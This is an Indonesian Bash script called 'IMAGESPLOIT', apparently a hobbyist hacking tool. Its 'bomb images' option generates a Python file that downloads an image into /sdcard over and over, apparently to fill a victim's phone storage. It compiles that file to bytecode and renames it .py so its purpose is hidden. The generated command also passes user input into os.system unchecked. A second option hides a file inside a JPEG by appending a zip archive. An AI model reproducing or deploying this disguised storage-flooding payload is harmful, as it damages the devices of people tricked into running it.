#!/bin/bash

# Kolor maklo
g="\033[32;1m"
y="\033[33;1m"
ig="\033[34;1m"
r="\033[35;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
r2='\033[31m'
i='$i'

echo -e $w"           _"$r2"___                      "$w", "
echo -e $w"          /-"$r2"--.'.__             ____"$w"// "
echo -e $r2"               '--.\           /.---' "
echo -e "          _______  \\         // "
echo -e "        /.------.\  \|      .'/  ______ "
echo -e $r2"       //  ___  \ \ ||"$w"/|\   "$r2"//  _/_----."$w"\__ "
echo -e $w"      |/"$r2"  /.-.\  \ \:|< >|// _/.'..\   "$w"'--' "
echo -e "         //   \'. | \'.|.'/ /_/ /  \.\ "
echo -e $w"        //     \ \_\/  ' ~\-'.-'    \.\ "
echo -e "       //       '-._| :H: |'-.__     \.\ "
echo -e $w"      //           "$r2"(/'==='\)"$w"'-._.\    |.| "
echo -e $w"      ||                        \.\    "$r2"\| "
echo -e $w"      ||                         \.\    "$r2"' "
echo -e $r2"      |/"$w"                          \.\ "
echo -e "                                   |.| "
echo -e "                                   |.| "
echo -e $r"    Author By"$c" : "$y"@SyhrulArv_"$r2"         \/ "
echo -e $r"    Github   "$c" : "$y"https://github.com/Syhrularv"
echo ""
echo -e $y"    <"$g"==== "$ig"\e[4mIMAGESPLOIT\e[0m "$g"===="$y">"
echo ""
echo -e $g"["$y"1"$g"]"$ig" CREATE BOMB IMAGES"
echo -e $g"["$y"2"$g"]"$ig" STEGANOGRAFI "$y"("$r2"menyisipkan file ke dalam images"$y")"
echo -e $g"["$y"3"$g"]"$ig" About me"
echo -e $g"["$y"4"$g"]"$ig" Exit"
echo ""
echo -e $r"Pilih nomernya gan.."
echo -e -n $r2"@B3LUXz >> "$w
read pilih;

bomjpg(){
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan link images "$r2"> "$w
read link;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan nama images "$r2"> "$w
read nama;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan jumlah images "$r2"> "$w
read jumlah;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan nama output file "$r2"> "$w
read otput;

cd output
touch $otput.py

echo -e "import os,sys\n\nos.chdir('/sdcard')\n\nfor i in range (1, $jumlah+1):\n   os.system('wget $link -O $nama'+ str(i) +'.jpg')" > $otput.py
python2 -OO -m py_compile $otput.py
rm $otput.py
mv $otput.pyo $otput.py
echo -e $y"["$g"*"$y"]"$w" Please wait.."
sleep 2
echo -e $y"["$g"√"$y"]"$w" Done tq :*"
}

steganografi(){
echo -e $y"["$r2"!"$y"]"$ig" FILE HARUS SATU FOLDER TARUH DI INTERNAL!"
echo ""
echo -e -n $g"["$r2"?"$g"]"$y"Nama folder"$r2" > "$w
read folder;
echo -e -n $g"["$r2"?"$g"]"$y"Nama file yg mau di sisipkan"$r2" > "$w
read file;
echo -e -n $g"["$r2"?"$g"]"$y"Nama file gambar"$r2" > "$w
read wadah;

cd /sdcard/$folder
zip test $file
echo -e $y"["$r2"*"$y"]"$ig"Please wait.."
sleep 1
cat $wadah test.zip >hasil.jpg

echo -e $y"["$g"√"$y"]"$ig"Done.. output dengan nama hasil.jpg"
rm test.zip
cd ~
}

case $pilih in
        1) bomjpg ;;
        2) steganografi ;;
        3) echo "Di buat oleh ig: @Syhrularv_ fb: Syhrül" | lolcat -a -d 500 ;;
        4) exit ;;
        *) echo "Pilih yg bener goblok!" ;;
esac

# Akhirnya selesai bangsat hehe :)
#SALAMHACKER

